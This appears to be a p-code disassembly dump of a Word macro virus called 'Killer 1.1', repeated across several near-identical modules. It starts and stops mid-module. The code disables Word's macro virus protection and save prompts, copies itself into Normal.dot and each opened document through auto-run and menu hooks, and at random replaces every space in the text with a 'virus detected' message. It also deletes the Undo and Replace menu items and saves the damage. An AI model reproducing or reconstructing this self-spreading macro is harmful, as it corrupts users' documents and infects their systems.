' Line #77:
' 	EndSub 
' Macros/VBA/killer11 - 4763 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Killer 1.1 ©S&L 2000"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	VarDefn SluzhFile
' Line #2:
' 	FuncDefn (Sub killer())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #12:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #13:
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt New 
' Line #14:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #15:
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #16:
' 	Label out 
' Line #17:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	St c 
' Line #19:
' 	Ld c 
' 	LitDI2 0x0023 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) kill 0x0000 
' 	EndIf 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub HelpAbout())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall (Call) killer 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub FileSave())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) killer 0x0000 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileSaveAs())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #34:
' 	ArgsCall (Call) killer 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub AutoOpen())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) killer 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) killer 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub ToolsMacro())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) killer 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub ViewVBCode())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) killer 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub kill())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #55:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #56:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #57:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #58:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #59:
' 	LitStr 0x001B "На кампе обнаружен вирус!!!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #60:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #61:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #64:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #66:
' 	EndWith 
' Line #67:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #68:
' 	LitStr 0x0015 "Undo VBA-Find.Execute"
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	LitStr 0x0011 "Repeat Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #70:
' 	LitStr 0x000A "Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub autonew())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall (Call) killer 0x0000 
' Line #77:
' 	EndSub 
' Macros/VBA/killer12 - 4763 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Killer 1.1 ©S&L 2000"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	VarDefn SluzhFile
' Line #2:
' 	FuncDefn (Sub killer())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #12:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #13:
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt New 
' Line #14:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #15:
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #16:
' 	Label out 
' Line #17:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	St c 
' Line #19:
' 	Ld c 
' 	LitDI2 0x0023 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) kill 0x0000 
' 	EndIf 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub HelpAbout())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall (Call) killer 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub FileSave())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) killer 0x0000 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileSaveAs())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #34:
' 	ArgsCall (Call) killer 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub AutoOpen())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) killer 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) killer 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub ToolsMacro())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) killer 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub ViewVBCode())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) killer 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub kill())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #55:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #56:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #57:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #58:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #59:
' 	LitStr 0x001B "На кампе обнаружен вирус!!!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #60:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #61:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #64:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #66:
' 	EndWith 
' Line #67:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #68:
' 	LitStr 0x0015 "Undo VBA-Find.Execute"
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	LitStr 0x0011 "Repeat Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #70:
' 	LitStr 0x000A "Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub autonew())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall (Call) killer 0x0000 
' Line #77:
' 	EndSub 
' Macros/VBA/killer13 - 5347 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Killer 1.1 ©S&L 2000"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	VarDefn SluzhFile
' Line #2:
' 	FuncDefn (Sub killer())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #12:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #13:
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt New 
' Line #14:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #15:
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #16:
' 	Label out 
' Line #17:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	St c 
' Line #19:
' 	Ld c 
' 	LitDI2 0x0023 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) kill 0x0000 
' 	EndIf 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub HelpAbout())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall (Call) killer 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub FileSave())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) killer 0x0000 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileSaveAs())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #34:
' 	ArgsCall (Call) killer 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub AutoOpen())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) killer 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) killer 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub ToolsMacro())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) killer 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub ViewVBCode())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) killer 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub kill())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #55:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #56:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #57:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #58:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #59:
' 	LitStr 0x001B "На кампе обнаружен вирус!!!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #60:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #61:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #64:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #66:
' 	EndWith 
' Line #67:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #68:
' 	LitStr 0x0015 "Undo VBA-Find.Execute"
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	LitStr 0x0011 "Repeat Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #70:
' 	LitStr 0x000A "Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub autonew())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall (Call) killer 0x0000 
' Line #77:
' 	EndSub 
' Macros/VBA/killer14 - 5347 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Killer 1.1 ©S&L 2000"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	VarDefn SluzhFile
' Line #2:
' 	FuncDefn (Sub killer())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #12:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #13:
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt New 
' Line #14:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #15:
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #16:
' 	Label out 
' Line #17:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	St c 
' Line #19:
' 	Ld c 
' 	LitDI2 0x0023 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) kill 0x0000 
' 	EndIf 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub HelpAbout())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall (Call) killer 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub FileSave())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) killer 0x0000 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileSaveAs())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #34:
' 	ArgsCall (Call) killer 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub AutoOpen())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) killer 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) killer 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub ToolsMacro())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) killer 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub ViewVBCode())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) killer 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub kill())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #55:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #56:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #57:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #58:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #59:
' 	LitStr 0x001B "На кампе обнаружен вирус!!!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #60:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #61:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #64:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #66:
' 	EndWith 
' Line #67:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #68:
' 	LitStr 0x0015 "Undo VBA-Find.Execute"
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	LitStr 0x0011 "Repeat Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #70:
' 	LitStr 0x000A "Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub autonew())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall (Call) killer 0x0000 
' Line #77:
' 	EndSub 
' Macros/VBA/killer15 - 4763 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Killer 1.1 ©S&L 2000"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	VarDefn SluzhFile
' Line #2:
' 	FuncDefn (Sub killer())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #12:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #13:
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt New 
' Line #14:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #15:
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #16:
' 	Label out 
' Line #17:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	St c 
' Line #19:
' 	Ld c 
' 	LitDI2 0x0023 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) kill 0x0000 
